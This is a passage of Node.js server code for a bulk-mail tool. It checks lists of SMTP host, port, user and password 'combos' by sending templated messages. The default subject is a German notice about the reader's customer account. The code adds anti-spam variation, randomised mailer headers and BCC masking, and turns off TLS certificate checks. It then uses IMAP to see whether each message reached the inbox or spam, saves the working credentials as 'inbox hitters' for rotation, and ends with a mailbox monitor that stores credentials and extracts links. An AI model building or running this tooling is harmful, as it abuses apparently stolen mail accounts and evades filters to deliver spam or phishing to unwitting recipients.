        } else {
          broadcast({
            type: 'log',
            data: `[Deliverability AI] ⚠️ Could not auto-detect IMAP for ${targetEmail}. Running in SMTP Relay 250 verification mode.`
          });
        }
      }

      broadcast({
        type: 'log',
        data: `[Template Studio] Active template loaded (${templateData.defaultLang}), Sender: "${templateData.senderName}", Mode: ${isBccMode ? 'BCC' : 'Normal Single'}, Subject: "${templateData.subject}".`
      });

      let comboIndex = 0;
      let completedCount = 0;
      let workersDone = false;

      // Start unified real-time IMAP monitor if IMAP is configured
      let imapMonitorPromise = Promise.resolve();

      if (imapConfig) {
        imapMonitorPromise = (async () => {
          let session = null;
          let spamFolders = ['Spam', 'Junk', 'INBOX.Spam', 'INBOX.Junk', 'Spamverdacht'];

          const connectSession = async () => {
            try {
              if (session) { try { session.close(); } catch (_) {} }
              session = new ImapSession(imapConfig.host, imapConfig.port);
              await session.connect(6000);
              const safeUser = imapConfig.user.replace(/["\\]/g, '\\$&');
              const safePass = imapConfig.pass.replace(/["\\]/g, '\\$&');
              const loginRes = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 6000);
              if (!loginRes.ok) {
                broadcast({ type: 'log', data: `[IMAP Monitor] ❌ Authentication failed for ${imapConfig.user}: invalid credentials` });
                return false;
              }
              const listRes = await session.exec('LIST "" "*"', 5000);
              if (listRes.ok) {
                const found = [];
                for (const line of listRes.data.split('\r\n')) {
                  const match = line.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" "([^"]+)"/i) || line.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" (.+)$/i);
                  if (match) {
                    const fName = match[1].trim();
                    if (/spam|junk|bulk|quarantine|verdacht/i.test(fName) && !found.includes(fName)) found.push(fName);
                  }
                }
                if (found.length > 0) spamFolders = found;
              }
              return true;
            } catch (err) {
              broadcast({ type: 'log', data: `[IMAP Monitor] Connection error: ${err.message}` });
              return false;
            }
          };

          let connected = await connectSession();
          if (!connected) {
            broadcast({ type: 'log', data: `[IMAP Monitor] Unable to open IMAP monitor session. Probes will fall back to relay-only.` });
            return;
          }

          while (checkerActive && !checkerAbort) {
            if (workersDone && checkerPendingProbes.length === 0) {
              break;
            }

            if (checkerPendingProbes.length === 0) {
              await new Promise(r => setTimeout(r, 600));
              continue;
            }

            try {
              // 1. Check INBOX for all pending probes
              const selInbox = await session.exec('SELECT "INBOX"', 5000);
              if (!selInbox.ok) {
                connected = await connectSession();
                if (!connected) break;
                continue;
              }

              // Fast bulk folder peeking of recent messages
              let inboxPeekData = '';
              try {
                const existsMatch = selInbox.data.match(/\*\s+([0-9]+)\s+EXISTS/i);
                if (existsMatch && parseInt(existsMatch[1], 10) > 0) {
                  const totalMsgs = parseInt(existsMatch[1], 10);
                  const startSeq = Math.max(1, totalMsgs - 15);
                  const peekRes = await session.exec(`FETCH ${startSeq}:${totalMsgs} (INTERNALDATE BODY.PEEK[HEADER.FIELDS (X-Smart-Probe-Token X-Delivery-Probe-ID Message-ID SUBJECT FROM)] BODY.PEEK[TEXT]<0.2048>)`, 4000);
                  if (peekRes.ok) inboxPeekData = peekRes.data;
                }
              } catch (_) {}

              for (const probe of [...checkerPendingProbes]) {
                if (checkerAbort || !checkerActive) break;

                let matched = false;

                // A) Check bulk peek data
                if (inboxPeekData && inboxPeekData.includes(probe.probeToken)) {
                  matched = true;
                }

                // B) Search custom header X-Smart-Probe-Token
                if (!matched) {
                  try {
                    const hRes = await session.exec(`SEARCH HEADER "X-Smart-Probe-Token" "${probe.probeToken}"`, 3000);
                    if (hRes.ok) {
                      const m = hRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                      if (m && m[1] && m[1].trim().length > 0) matched = true;
                    }
                  } catch (_) {}
                }

                // C) Search TEXT (contains hidden probe span & plain text probe)
                if (!matched) {
                  try {
                    const tRes = await session.exec(`SEARCH TEXT "${probe.probeToken}"`, 3000);
                    if (tRes.ok) {
                      const m = tRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                      if (m && m[1] && m[1].trim().length > 0) matched = true;
                    }
                  } catch (_) {}
                }

                // D) Search BODY
                if (!matched) {
                  try {
                    const bRes = await session.exec(`SEARCH BODY "${probe.probeToken}"`, 3000);
                    if (bRes.ok) {
                      const m = bRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                      if (m && m[1] && m[1].trim().length > 0) matched = true;
                    }
                  } catch (_) {}
                }

                if (matched) {
                  probe.record.status = 'inbox';
                  probe.record.folder = 'INBOX';
                  checkerStats.inbox++;

                  const key = `${probe.record.host}|${probe.record.port}|${probe.record.user}|${probe.record.pass}`;
                  if (!checkerWorkingSmtps.includes(key)) checkerWorkingSmtps.push(key);

                  // Auto-store verified hitter to inbox-hitters.txt
                  try {
                    const hitterLine = `${probe.record.host}|${probe.record.port}|${probe.record.user}|${probe.record.pass}\n`;
                    const hittersPath = path.join(__dirname, 'inbox-hitters.txt');
                    let existingHitters = fs.existsSync(hittersPath) ? fs.readFileSync(hittersPath, 'utf8') : '';
                    const checkPrefix = `${probe.record.host}|${probe.record.port}|${probe.record.user}`;
                    if (!existingHitters.includes(checkPrefix)) {
                      fs.appendFileSync(hittersPath, hitterLine);
                    }
                  } catch (_) {}

                  broadcast({
                    type: 'log',
                    data: `[Smart Inbox Verifier] ✅ VERIFIED INBOX: ${probe.record.host}:${probe.record.port} (${probe.record.user}) landed in INBOX! [Token: ${probe.probeToken}]`
                  });
                  broadcast({
                    type: 'smtp-checker-progress',
                    data: { ...probe.record, workingSmtpsCount: checkerWorkingSmtps.length }
                  });

                  const idx = checkerPendingProbes.indexOf(probe);
                  if (idx !== -1) checkerPendingProbes.splice(idx, 1);
                }
              }

              // 2. Check SPAM folders for remaining pending probes
              if (checkerPendingProbes.length > 0 && !checkerAbort && checkerActive) {
                for (const sf of spamFolders) {
                  if (checkerPendingProbes.length === 0 || checkerAbort || !checkerActive) break;
                  const selSpam = await session.exec(`SELECT "${sf}"`, 4000);
                  if (!selSpam.ok) continue;

                  let spamPeekData = '';
                  try {
                    const existsMatch = selSpam.data.match(/\*\s+([0-9]+)\s+EXISTS/i);
                    if (existsMatch && parseInt(existsMatch[1], 10) > 0) {
                      const totalMsgs = parseInt(existsMatch[1], 10);
                      const startSeq = Math.max(1, totalMsgs - 15);
                      const peekRes = await session.exec(`FETCH ${startSeq}:${totalMsgs} (INTERNALDATE BODY.PEEK[HEADER.FIELDS (X-Smart-Probe-Token X-Delivery-Probe-ID Message-ID SUBJECT FROM)] BODY.PEEK[TEXT]<0.2048>)`, 4000);
                      if (peekRes.ok) spamPeekData = peekRes.data;
                    }
                  } catch (_) {}

                  for (const probe of [...checkerPendingProbes]) {
                    if (checkerAbort || !checkerActive) break;
                    let matchedSpam = false;

                    if (spamPeekData && spamPeekData.includes(probe.probeToken)) {
                      matchedSpam = true;
                    }

                    if (!matchedSpam) {
                      try {
                        const hRes = await session.exec(`SEARCH HEADER "X-Smart-Probe-Token" "${probe.probeToken}"`, 3000);
                        if (hRes.ok) {
                          const m = hRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                          if (m && m[1] && m[1].trim().length > 0) matchedSpam = true;
                        }
                      } catch (_) {}
                    }

                    if (!matchedSpam) {
                      try {
                        const tRes = await session.exec(`SEARCH TEXT "${probe.probeToken}"`, 3000);
                        if (tRes.ok) {
                          const m = tRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                          if (m && m[1] && m[1].trim().length > 0) matchedSpam = true;
                        }
                      } catch (_) {}
                    }

                    if (!matchedSpam) {
                      try {
                        const bRes = await session.exec(`SEARCH BODY "${probe.probeToken}"`, 3000);
                        if (bRes.ok) {
                          const m = bRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
                          if (m && m[1] && m[1].trim().length > 0) matchedSpam = true;
                        }
                      } catch (_) {}
                    }

                    if (matchedSpam) {
                      probe.record.status = 'spam';
                      probe.record.folder = sf;
                      checkerStats.spam++;
                      broadcast({
                        type: 'log',
                        data: `[Smart Inbox Verifier] ⚠️ SPAM DETECTED: ${probe.record.host}:${probe.record.port} (${probe.record.user}) arrived in ${sf}! [Token: ${probe.probeToken}]`
                      });
                      broadcast({
                        type: 'smtp-checker-progress',
                        data: { ...probe.record, workingSmtpsCount: checkerWorkingSmtps.length }
                      });
                      const idx = checkerPendingProbes.indexOf(probe);
                      if (idx !== -1) checkerPendingProbes.splice(idx, 1);
                    }
                  }
                }
              }

              // 3. Timeout check: probes waiting > 25 seconds without arriving
              const now = Date.now();
              for (const probe of [...checkerPendingProbes]) {
                if (now - probe.sendTime > 25000) {
                  probe.record.status = 'not_arrived';
                  probe.record.folder = 'DROPPED / NOT IN BOX';
                  probe.record.error = `Sent 250 OK, but token [${probe.probeToken}] not detected in mailbox after 25s`;
                  checkerStats.failed++;
                  broadcast({
                    type: 'log',
                    data: `[Smart Inbox Verifier] ❌ NOT IN BOX: ${probe.record.host}:${probe.record.port} (${probe.record.user}) timed out without mailbox arrival.`
                  });
                  broadcast({
                    type: 'smtp-checker-progress',
                    data: { ...probe.record, workingSmtpsCount: checkerWorkingSmtps.length }
                  });
                  const idx = checkerPendingProbes.indexOf(probe);
                  if (idx !== -1) checkerPendingProbes.splice(idx, 1);
                }
              }

              // Sleep 1.2s before next check pass
              await new Promise(r => setTimeout(r, 1200));
            } catch (err) {
              broadcast({ type: 'log', data: `[IMAP Monitor] Check cycle notice: ${err.message}` });
              await new Promise(r => setTimeout(r, 1500));
            }
          }

          if (session) { try { session.close(); } catch (_) {} }
        })();
      }

      const runWorker = async (workerId) => {
        while (comboIndex < parsedCombos.length && checkerActive && !checkerAbort) {
          const item = parsedCombos[comboIndex++];
          if (!item) break;

          const { host, port, user, pass } = item;
          const probeToken = utils.generateProbeToken();
          const randomId = String(Math.floor(100000 + Math.random() * 900000));

          const activeLink = (templateData.links && templateData.links.length > 0)
            ? templateData.links[Math.floor(Math.random() * templateData.links.length)]
            : utils.resolveSmartLink({ lang: templateData.defaultLang });

          const context = {
            email: targetEmail,
            user: targetEmail.split('@')[0],
            domain: targetEmail.split('@')[1],
            link: activeLink,
            header: templateData.header || '',
            footer: templateData.footer || '',
            random_id: randomId,
            randomId: randomId,
            lang: templateData.defaultLang,
            probeToken,
            token: probeToken,
            probe_token: probeToken,
            testToken: probeToken,
            host,
            port,
            smtp: `${host}:${port}`,
            smtp_node: `${host}:${port}`,
            smtp_host: host,
            smtp_port: port,
            smtp_user: user,
            senderUser: user
          };

          // Authentic Subject from Template Studio - Clean, normal send without probe tag prefixes
          let rawSubject = templateData.subject || 'Wichtige Mitteilung zu Ihrem Kundenkonto';
          let processedSubject = utils.replaceTags(rawSubject, context);

          // Authentic HTML Letter from Template Studio - Clean, normal send without sample banner
          let processedHtml = templateData.html;
          if (templateData.header && (processedHtml.includes('{header}') || processedHtml.includes('{{header}}') || processedHtml.includes('[header]'))) {
            processedHtml = processedHtml.replace(/(?:\{\{|\{|\[)header(?:\}\}|\])/gi, templateData.header);
          }
          if (templateData.footer && (processedHtml.includes('{footer}') || processedHtml.includes('{{footer}}') || processedHtml.includes('[footer]'))) {
            processedHtml = processedHtml.replace(/(?:\{\{|\{|\[)footer(?:\}\}|\])/gi, templateData.footer);
          }
          processedHtml = utils.replaceTags(processedHtml, context);
          processedHtml = utils.addAntiSpamVariation(processedHtml);

          // Embed zero-visibility probe token invisibly into HTML and plain-text
          let plainText = utils.htmlToPlainText(processedHtml);
          const embedded = utils.embedProbeToken(processedHtml, plainText, probeToken, host, port);
          processedHtml = embedded.html;
          plainText = embedded.text;

          const mailHeaders = {
            ...utils.getRandomMailerHeaders(user),
            'X-Smart-Probe-Token': probeToken,
            'X-Delivery-Probe-ID': probeToken,
            'X-SMTP-Tester-Node': `${host}:${port}`,
            'X-SMTP-Tester-User': user
          };

          const mailOptions = {
            from: `"${templateData.senderName}" <${user}>`,
            subject: processedSubject,
            html: processedHtml,
            text: plainText,
            headers: mailHeaders
          };

          // Mode handling from config: BCC mode vs Normal Single mode
          if (isBccMode) {
            const bccMask = (templateData.bccConfig.bccEmail && templateData.bccConfig.bccEmail.trim())
              ? templateData.bccConfig.bccEmail.trim()
              : user;
            mailOptions.to = `"${templateData.senderName}" <${bccMask}>`;
            mailOptions.bcc = targetEmail;
            if (templateData.replyTo) {
              mailOptions.replyTo = templateData.replyTo;
            } else if (templateData.bccConfig.bccEmail) {
              mailOptions.replyTo = templateData.bccConfig.bccEmail;
            }
          } else {
            mailOptions.to = targetEmail;
            if (templateData.replyTo) {
              mailOptions.replyTo = templateData.replyTo;
            }
          }

          const startTime = Date.now();
          let status = 'failed';
          let folder = 'AUTH FAIL';
          let errorMsg = null;
          let latency = 0;

          try {
            const transporter = nodemailer.createTransport({
              host,
              port,
              secure: port === 465,
              auth: { user, pass },
              tls: { rejectUnauthorized: false },
              connectionTimeout: probeTimeout,
              greetingTimeout: probeTimeout
            });

            await transporter.sendMail(mailOptions);
            latency = Date.now() - startTime;
            try { transporter.close(); } catch (_) {}

            if (imapConfig) {
              status = 'verifying';
              folder = 'WAITING MAILBOX ARRIVAL';
            } else {
              status = 'sent';
              folder = 'RELAY 250 OK';
              checkerStats.relay++;
              const key = `${host}|${port}|${user}|${pass}`;
              if (!checkerWorkingSmtps.includes(key)) checkerWorkingSmtps.push(key);
            }
          } catch (sendErr) {
            latency = Date.now() - startTime;
            status = 'failed';
            folder = 'CONNECT / AUTH FAIL';
            errorMsg = sendErr.message || 'Connection refused or auth failed';
            checkerStats.failed++;
          }

          completedCount++;
          checkerStats.tested = completedCount;

          const record = {
            index: completedCount,
            total: parsedCombos.length,
            host,
            port,
            user,
            pass,
            status,
            folder,
            error: errorMsg,
            latency,
            probeToken,
            subject: processedSubject,
            mode: isBccMode ? 'bcc' : 'single',
            workingSmtpsCount: checkerWorkingSmtps.length
          };

          broadcast({
            type: 'smtp-checker-progress',
            data: record
          });

          if (status === 'verifying') {
            checkerPendingProbes.push({
              record,
              probeToken,
              host,
              port,
              user,
              pass,
              sendTime: startTime,
              subject: processedSubject
            });
          }
        }
      };

      // Launch worker pool
      const pool = [];
      const numThreads = Math.min(parsedConcur, parsedCombos.length);
      for (let w = 0; w < numThreads; w++) {
        pool.push(runWorker(w + 1));
      }
      await Promise.all(pool);
      workersDone = true;

      // Wait for real-time IMAP monitor to finish verifying all active probes
      await imapMonitorPromise;

      checkerActive = false;
      broadcast({
        type: 'smtp-checker-finished',
        data: {
          total: parsedCombos.length,
          inbox: checkerStats.inbox,
          spam: checkerStats.spam,
          failed: checkerStats.failed,
          workingCount: checkerWorkingSmtps.length
        }
      });
      broadcast({
        type: 'log',
        data: `[SMTP Verifier] Finished test run: ${checkerStats.inbox} INBOX verified, ${checkerStats.spam} spam, ${checkerStats.failed} failed (${parsedCombos.length} total).`
      });
    })().catch(e => {
      console.error('Checker background error:', e);
      checkerActive = false;
    });

  } catch (error) {
    checkerActive = false;
    res.status(500).json({ error: error.message });
  }
});

// Stop SMTP Inbox Verification
app.post('/api/smtp-checker/stop', (req, res) => {
  checkerActive = false;
  checkerAbort = true;
  checkerPendingProbes = [];
  broadcast({
    type: 'log',
    data: `[SMTP Verifier] 🛑 Operator aborted active verification run.`
  });
  res.json({ success: true, message: 'Abort dispatched' });
});

// Save verified working SMTPs to Rotation Hub (smtp.txt)
app.post('/api/smtp-checker/save-working', (req, res) => {
  try {
    const { mode = 'append', hits, onlyInbox = true } = req.body;
    const smtpPath = path.join(__dirname, 'smtp.txt');

    let toSave = [];
    if (Array.isArray(hits) && hits.length > 0) {
      toSave = hits;
    } else {
      toSave = checkerWorkingSmtps;
    }

    if (!toSave || toSave.length === 0) {
      return res.status(400).json({ error: 'No verified working SMTP servers available to save. Only verified nodes are added.' });
    }

    let existingLines = [];
    if (fs.existsSync(smtpPath) && mode === 'append') {
      const content = fs.readFileSync(smtpPath, 'utf8');
      existingLines = content.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    }

    // Merge and deduplicate
    const combinedSet = new Set([...existingLines, ...toSave]);
    const finalLines = Array.from(combinedSet);

    fs.writeFileSync(smtpPath, finalLines.join('\n') + '\n', 'utf8');

    res.json({
      success: true,
      savedCount: toSave.length,
      totalInHub: finalLines.length
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get current inbox hitters
app.get('/api/inbox-hitters', (req, res) => {
  try {
    const hittersPath = path.join(__dirname, 'inbox-hitters.txt');
    if (!fs.existsSync(hittersPath)) {
      return res.json({ hitters: [] });
    }
    const lines = fs.readFileSync(hittersPath, 'utf8')
      .split('\n')
      .map(l => l.trim())
      .filter(l => l && !l.startsWith('#'));
    res.json({ hitters: lines });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Real-time preflight inbox qualifier for Launch Wizard
app.post('/api/smart-inbox-qualify', async (req, res) => {
  try {
    const { targetEmail, targetPassword, sampleCount = 3 } = req.body;
    if (!targetEmail || !targetEmail.includes('@')) {
      return res.status(400).json({ error: 'Valid targetEmail is required' });
    }
    if (!targetPassword || !targetPassword.trim()) {
      return res.status(400).json({ error: 'Target email password is required for live IMAP qualification' });
    }

    // Auto-discover IMAP
    broadcast({
      type: 'log',
      data: `[Smart Guard] Auto-discovering IMAP mailbox for ${targetEmail}...`
    });

    const imapConfig = await autoDiscoverImap(targetEmail, targetPassword.trim());
    if (!imapConfig) {
      return res.status(400).json({
        error: `Could not connect to IMAP server for ${targetEmail}. Please check email address and app password.`
      });
    }

    broadcast({
      type: 'log',
      data: `[Smart Guard] Verified IMAP server: ${imapConfig.host}:${imapConfig.port}`
    });

    // Load candidate SMTPs from smtp.txt
    const smtpPath = path.join(__dirname, 'smtp.txt');
    if (!fs.existsSync(smtpPath)) {
      return res.status(400).json({ error: 'No smtp.txt file found' });
    }

    const lines = fs.readFileSync(smtpPath, 'utf8')
      .split('\n')
      .map(l => l.trim())
      .filter(l => l && !l.startsWith('#'));

    if (lines.length === 0) {
      return res.status(400).json({ error: 'No SMTP credentials in smtp.txt' });
    }

    // Pick random candidates to test until an inbox hitter is confirmed
    const shuffled = [...lines].sort(() => 0.5 - Math.random());
    const maxTestLimit = Math.min(shuffled.length, Math.max(Number(sampleCount) || 5, 10));
    const candidates = shuffled.slice(0, maxTestLimit);

    const results = [];
    let inboxHits = 0;
    let spamDrops = 0;

    const templateData = getActiveTemplateData();
    const rawSubject = (req.body.customSubject || req.body.subject || templateData.subject).trim();

    for (let i = 0; i < candidates.length; i++) {
      const line = candidates[i];
      const parts = line.split('|');
      const host = parts[0]?.trim();
      const port = parseInt(parts[1]?.trim(), 10) || 587;
      const user = parts[2]?.trim();
      const pass = parts[3]?.trim();

      broadcast({
        type: 'log',
        data: `[Smart Guard (${i + 1}/${candidates.length})] Testing candidate SMTP ${host}:${port} (${user})...`
      });

      let testResult = { host, port, user, status: 'error', landed: 'unknown' };

      try {
        const transporter = nodemailer.createTransport({
          host,
          port,
          secure: port === 465,
          auth: { user, pass },
          tls: { rejectUnauthorized: false },
          connectionTimeout: 10000,
          socketTimeout: 15000
        });

        const activeLink = (templateData.links && templateData.links.length > 0)
          ? templateData.links[Math.floor(Math.random() * templateData.links.length)]
          : utils.resolveSmartLink({ lang: templateData.defaultLang });

        const randomId = String(Math.floor(100000 + Math.random() * 900000));
        const context = {
          email: targetEmail,
          user: targetEmail.split('@')[0],
          domain: targetEmail.split('@')[1],
          link: activeLink,
          random_id: randomId,
          randomId: randomId,
          lang: templateData.defaultLang
        };

        const subject = utils.replaceTags(rawSubject, context);
        context.subject = subject;

        let html = templateData.html || '<p>Smart Guard Inbox Placement Verification Test</p>';
        html = utils.replaceTags(html, context);
        html = utils.addAntiSpamVariation(html);
        const text = utils.htmlToPlainText(html);

        const senderDisplayName = (templateData.senderName && templateData.senderName.trim())
          ? `"${templateData.senderName.trim()}" `
          : '';

        const probeToken = utils.generateProbeToken();
        const embedded = utils.embedProbeToken(html, text, probeToken);
        html = embedded.html;

        const customHeaders = {
          ...utils.getRandomMailerHeaders(user),
          'X-Smart-Probe-Token': probeToken,
          'X-Delivery-Probe-ID': probeToken
        };

        const sendTime = Date.now();
        await transporter.sendMail({
          from: `${senderDisplayName}<${user}>`,
          to: targetEmail,
          subject,
          html,
          text: embedded.text,
          headers: customHeaders
        });

        transporter.close();

        // Inspect IMAP placement with unique probeToken
        broadcast({
          type: 'log',
          data: `[Smart Guard] Relay accepted from ${host}:${port}. Verifying unique probe arrival (${probeToken}) via IMAP...`
        });

        const placement = await checkImapPlacement(
          imapConfig,
          user,
          subject,
          sendTime,
          25000,
          (msg) => broadcast({ type: 'log', data: msg }),
          probeToken
        );

        testResult.landed = placement.landed;

        if (placement.landed === 'inbox') {
          inboxHits++;
          testResult.status = 'inbox';
          // Save to inbox-hitters.txt
          const hittersPath = path.join(__dirname, 'inbox-hitters.txt');
          let existingHitters = '';
          if (fs.existsSync(hittersPath)) {
            existingHitters = fs.readFileSync(hittersPath, 'utf8');
          }
          if (!existingHitters.includes(line)) {
            fs.appendFileSync(hittersPath, line + '\n', 'utf8');
          }
          broadcast({
            type: 'inbox-hit',
            data: { host, port, user, folder: placement.folder }
          });
          broadcast({
            type: 'log',
            data: `[Smart Guard] \u2705 VERIFIED INBOX: ${host}:${port} (${user}) landed in INBOX! Stored to inbox-hitters.txt.`
          });
          results.push(testResult);
          // Confirmed working inbox node found! Stop trying and proceed.
          break;
        } else if (placement.landed === 'spam') {
          spamDrops++;
          testResult.status = 'spam';
          broadcast({
            type: 'spam-drop',
            data: { host, port, user, folder: placement.folder }
          });
          broadcast({
            type: 'log',
            data: `[Smart Guard] \u26A0\uFE0F SPAM DETECTED: ${host}:${port} landed in ${placement.folder || 'Spam'} folder. Trying another random SMTP...`
          });
        } else {
          // not_arrived or error (DROPPED / NOT IN BOX)
          testResult.status = placement.landed;
          broadcast({
            type: 'log',
            data: `[Smart Guard] \u274C NOT IN BOX: ${host}:${port} delivery status: ${placement.landed} (${placement.folder || 'DROPPED / NOT IN BOX'}). Trying another random SMTP...`
          });
        }
      } catch (sendErr) {
        testResult.error = sendErr.message;
        broadcast({
          type: 'log',
          data: `[Smart Guard] \u274C SMTP Error for ${host}:${port}: ${sendErr.message}. Trying another random SMTP...`
        });
      }

      results.push(testResult);
    }

    const allFailed = results.length > 0 && inboxHits === 0;
    if (allFailed) {
      broadcast({
        type: 'spam-alert',
        data: {
          reason: 'no_inbox_hitters',
          testedCount: results.length,
          spamCount: spamDrops,
          title: 'Letter Dropped in Spam / Not In Box!',
          message: `All ${results.length} tested SMTP servers failed to reach INBOX (${spamDrops} landed in Spam, ${results.length - spamDrops} dropped/not arrived). Campaign sending aborted!`
        }
      });
    }

    res.json({
      success: true,
      testedCount: results.length,
      inboxHits,
      spamDrops,
      allSpam: allFailed,
      allFailed,
      results
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
/* ==========================================================================
   AUTHORIZED MAILBOX ACTIVITY MONITOR & REAL-TIME IMAP EVENT SUBSCRIPTION
   ========================================================================== */

// In-memory cache for message bodies and extracted links: key = `${account}:${folder}:${uid}`
const mailboxMessageCache = new Map();

// Global state for batch indexing monitor
let monitorActive = false;
let monitorResults = [];
let monitorCredentialsStore = new Map(); // Store parsed credentials for on-demand fetch
const activeMonitorSessions = new Set();
let monitorConcurrency = 10;

// Global state for live event subscription
let activeSubscription = {
  active: false,
  email: null,
  pass: null,
  host: null,
  port: 993,
  keywords: [],
  session: null,
  highestUid: 0,
  timer: null
};

/**
 * Decode RFC 2047 MIME encoded headers (=?UTF-8?B?...?= or =?UTF-8?Q?...?=)
 */
function decodeMimeHeader(raw) {
  if (!raw) return '';
  return raw.replace(/=\?([^?]+)\?([BbQq])\?([^?]*)\?=/g, (match, charset, enc, text) => {
    try {
      if (enc.toUpperCase() === 'B') {
        return Buffer.from(text, 'base64').toString('utf8');
      } else if (enc.toUpperCase() === 'Q') {
        const decoded = text
          .replace(/_/g, ' ')
          .replace(/=([A-Fa-f0-9]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
        return decoded;
      }
    } catch (e) {}
    return match;
  });
}

/**
 * Parses a From header into display name and email address
 */
function parseFromHeader(fromHeader) {
  if (!fromHeader) return { name: '', address: '', raw: '' };
  const raw = decodeMimeHeader(fromHeader).trim();
  const angleMatch = raw.match(/^(?:"?([^"]*)"?\s*)?<([^>]+)>/);
  if (angleMatch) {
    return {
      name: (angleMatch[1] || '').trim(),
      address: (angleMatch[2] || '').trim(),
      raw
    };
  }
  return {
    name: '',
    address: raw,
    raw
  };
}

/**
 * Extracts and deduplicates HTTPS/HTTP links from HTML and text bodies
 */
function extractLinks(html, text) {
  const links = [];
  const seen = new Set();

  function addUrl(rawUrl, label = '') {
    if (!rawUrl) return;
    let clean = rawUrl.trim().replace(/^["']|["']$/g, '');
    clean = clean.replace(/[.,;:!?)>\]]+$/, '');
    if (!clean.startsWith('https://') && !clean.startsWith('http://')) return;
    if (seen.has(clean)) return;
    seen.add(clean);

    let domain = '';
    try {
      const parsed = new URL(clean);
      domain = parsed.hostname;
    } catch (e) {
      const m = clean.match(/^https?:\/\/([^/?#]+)/i);
      if (m) domain = m[1];
    }

    links.push({
      url: clean,
      domain: domain || 'external',
      text: label ? label.trim().substring(0, 100) : domain
    });
  }

  // 1. From HTML anchors (non-backtracking safe regex)
  if (html) {
    const aTagRegex = /<a\b[^>]*?\bhref=["'](https?:\/\/[^"'\s>]+)["'][^>]*>([\s\S]*?)<\/a>/gi;
    let match;
    while ((match = aTagRegex.exec(html)) !== null) {
      const url = match[1];
      const linkText = match[2].replace(/<[^>]*>/g, '').trim();
      addUrl(url, linkText);
    }
  }

  // 2. Generic URL extraction
  const combined = `${html || ''}\n${text || ''}`;
  const urlRegex = /(https?:\/\/[^\s"'<>\(\)\[\]{}]+)/gi;
  let m;
  while ((m = urlRegex.exec(combined)) !== null) {
    addUrl(m[1]);
  }

  return links;
}

/**
 * Unpacks MIME structure into HTML and Plain Text components.
 * Handles top-level headers, inline boundary delimiters, base64, and quoted-printable encodings.
 * Protected against infinite recursion with strict depth bounding.
 */
function unpackMimeBody(rawMessage, depth = 0) {
  if (!rawMessage || depth > 3) {
    return { html: '', text: rawMessage || '' };
  }

  function decodeTransferEncoding(content, encoding) {
    const enc = (encoding || '').toLowerCase().trim();
    if (enc === 'base64') {
      try {
        return Buffer.from(content.replace(/\s+/g, ''), 'base64').toString('utf8');
      } catch (e) {
        return content;
      }
    } else if (enc === 'quoted-printable') {
      return content
        .replace(/=\r?\n/g, '')
        .replace(/=([A-Fa-f0-9]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
    }
    return content;
  }

  // 1. Detect boundary anywhere in headers OR directly in the message body
  let boundary = null;
  const bMatch = rawMessage.match(/boundary=["']?([^"';\r\n]+)["']?/i);
  if (bMatch) {
    boundary = bMatch[1].trim();
  } else {
    // Check if rawMessage starts with or contains a MIME boundary like --===============...
    const rawBMatch = rawMessage.match(/^--([A-Za-z0-9_=\-\.]+)/m);
    if (rawBMatch) {
      boundary = rawBMatch[1].trim();
    }
  }

  if (boundary) {
    const escapedBoundary = boundary.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const parts = rawMessage.split(new RegExp(`--${escapedBoundary}(?:--)?\r?\n?`));
    
    // Only proceed if parts actually split into multiple segments
    if (parts.length > 1) {
      let extractedHtml = '';
      let extractedText = '';

      for (const part of parts) {
        const trimmed = part.trim();
        if (!trimmed || trimmed === '--' || part === rawMessage) continue;

        const pSplit = part.search(/\r?\n\r?\n/);
        let pHeader = '';
        let pBody = '';

        if (pSplit !== -1) {
          pHeader = part.substring(0, pSplit);
          pBody = part.substring(pSplit).replace(/^\r?\n\r?\n/, '');
        } else {
          pBody = part;
        }

        const pCtMatch = pHeader.match(/Content-Type:\s*([^;\r\n]+)/i);
        const pEncodingMatch = pHeader.match(/Content-Transfer-Encoding:\s*([^\r\n]+)/i);

        const pCt = pCtMatch ? pCtMatch[1].toLowerCase().trim() : '';
        const pEnc = pEncodingMatch ? pEncodingMatch[1].toLowerCase().trim() : '';

        const decoded = decodeTransferEncoding(pBody, pEnc);

        if (pCt.includes('text/html') || (!pCt && (decoded.includes('<html') || decoded.includes('<!DOCTYPE') || decoded.includes('<body') || decoded.includes('<table')))) {
          extractedHtml = decoded;
        } else if (pCt.includes('text/plain') && !extractedText) {
          extractedText = decoded;
        } else if (pCt.includes('multipart/') && depth < 2 && part.length < rawMessage.length) {
          const nested = unpackMimeBody(part, depth + 1);
          if (nested.html && !extractedHtml) extractedHtml = nested.html;
          if (nested.text && !extractedText) extractedText = nested.text;
        } else if (!extractedHtml && (decoded.includes('<html') || decoded.includes('<!DOCTYPE') || decoded.includes('<table'))) {
          extractedHtml = decoded;
        } else if (!extractedText && decoded.trim()) {
          extractedText = decoded;
        }
      }

      if (extractedHtml || extractedText) {
        return {
          html: extractedHtml,
          text: extractedText
        };
      }
    }
  }

  // 2. Direct single-part MIME check
  const splitIdx = rawMessage.search(/\r?\n\r?\n/);
  if (splitIdx !== -1) {
    const headerPart = rawMessage.substring(0, splitIdx);
    const bodyPart = rawMessage.substring(splitIdx).replace(/^\r?\n\r?\n/, '');

    const ctMatch = headerPart.match(/Content-Type:\s*([^;\r\n]+)/i);
    const teMatch = headerPart.match(/Content-Transfer-Encoding:\s*([^\r\n]+)/i);

    const contentType = ctMatch ? ctMatch[1].toLowerCase().trim() : '';
    const transferEncoding = teMatch ? teMatch[1].toLowerCase().trim() : '';

    const decoded = decodeTransferEncoding(bodyPart, transferEncoding);
    if (contentType.includes('text/html') || decoded.includes('<html') || decoded.includes('<!DOCTYPE') || decoded.includes('<table')) {
      return { html: decoded, text: '' };
    }
    return { html: '', text: decoded };
